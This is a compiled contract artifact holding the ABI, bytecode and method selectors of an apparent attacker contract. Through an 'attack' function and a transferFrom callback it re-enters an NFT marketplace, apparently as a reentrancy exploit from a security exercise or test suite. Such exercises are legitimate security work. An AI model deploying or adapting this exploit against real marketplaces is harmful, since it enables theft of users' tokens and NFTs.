{"abi":[{"type":"constructor","inputs":[{"name":"_market","type":"address","internalType":"contract NFTMarket"},{"name":"_token","type":"address","internalType":"contract IERC20"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[{"name":"nft","type":"address","internalType":"address"},{"name":"tokenId","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"attacking","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"market","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract NFTMarket"}],"stateMutability":"view"},{"type":"function","name":"token","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IERC20"}],"stateMutability":"view"},{"type":"function","name":"transferFrom","inputs":[{"name":"from","type":"address","internalType":"address"},{"name":"to","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561000f575f5ffd5b506040516108d53803806108d583398181016040528101906100319190610161565b815f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505061019f565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e4826100bb565b9050919050565b5f6100f5826100da565b9050919050565b610105816100eb565b811461010f575f5ffd5b50565b5f81519050610120816100fc565b92915050565b5f610130826100da565b9050919050565b61014081610126565b811461014a575f5ffd5b50565b5f8151905061015b81610137565b92915050565b5f5f60408385031215610177576101766100b7565b5b5f61018485828601610112565b92505060206101958582860161014d565b9150509250929050565b610729806101ac5f395ff3fe608060405234801561000f575f5ffd5b5060043610610055575f3560e01c806323b872dd146100595780633c0bbcd91461008957806352fba25c146100a757806380f55605146100c3578063fc0c546a146100e1575b5f5ffd5b610073600480360381019061006e919061048b565b6100ff565b60405161008091906104f5565b60405180910390f35b61009161021b565b60405161009e91906104f5565b60405180910390f35b6100c160048036038101906100bc919061050e565b61022e565b005b6100cb6103b1565b6040516100d891906105a7565b60405180910390f35b6100e96103d5565b6040516100f691906105e0565b60405180910390f35b5f600160149054906101000a900460ff16801561016757505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b15610210575f600160146101000a81548160ff0219169083151502179055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a82ba76f3360016040518363ffffffff1660e01b81526004016101e2929190610641565b5f604051808303815f87803b1580156101f9575f5ffd5b505af115801561020b573d5f5f3e3d5ffd5b505050505b600190509392505050565b600160149054906101000a900460ff1681565b60018060146101000a81548160ff02191690831515021790555060015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b35f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b81526004016102e4929190610677565b6020604051808303815f875af1158015610300573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061032491906106c8565b505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a82ba76f83836040518363ffffffff1660e01b8152600401610380929190610677565b5f604051808303815f87803b158015610397575f5ffd5b505af11580156103a9573d5f5f3e3d5ffd5b505050505050565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610427826103fe565b9050919050565b6104378161041d565b8114610441575f5ffd5b50565b5f813590506104528161042e565b92915050565b5f819050919050565b61046a81610458565b8114610474575f5ffd5b50565b5f8135905061048581610461565b92915050565b5f5f5f606084860312156104a2576104a16103fa565b5b5f6104af86828701610444565b93505060206104c086828701610444565b92505060406104d186828701610477565b9150509250925092565b5f8115159050919050565b6104ef816104db565b82525050565b5f6020820190506105085f8301846104e6565b92915050565b5f5f60408385031215610524576105236103fa565b5b5f61053185828601610444565b925050602061054285828601610477565b9150509250929050565b5f819050919050565b5f61056f61056a610565846103fe565b61054c565b6103fe565b9050919050565b5f61058082610555565b9050919050565b5f61059182610576565b9050919050565b6105a181610587565b82525050565b5f6020820190506105ba5f830184610598565b92915050565b5f6105ca82610576565b9050919050565b6105da816105c0565b82525050565b5f6020820190506105f35f8301846105d1565b92915050565b6106028161041d565b82525050565b5f819050919050565b5f61062b61062661062184610608565b61054c565b610458565b9050919050565b61063b81610611565b82525050565b5f6040820190506106545f8301856105f9565b6106616020830184610632565b9392505050565b61067181610458565b82525050565b5f60408201905061068a5f8301856105f9565b6106976020830184610668565b9392505050565b6106a7816104db565b81146106b1575f5ffd5b50565b5f815190506106c28161069e565b92915050565b5f602082840312156106dd576106dc6103fa565b5b5f6106ea848285016106b4565b9150509291505056fea2646970667358221220f10d58e870465f31940aff3ff695387667987d0960b473c2fc7374c317fc05c264736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack(address,uint256)":"52fba25c","attacking()":"3c0bbcd9","market()":"80f55605","token()":"fc0c546a","transferFrom(address,address,uint256)":"23b872dd"},"id":36}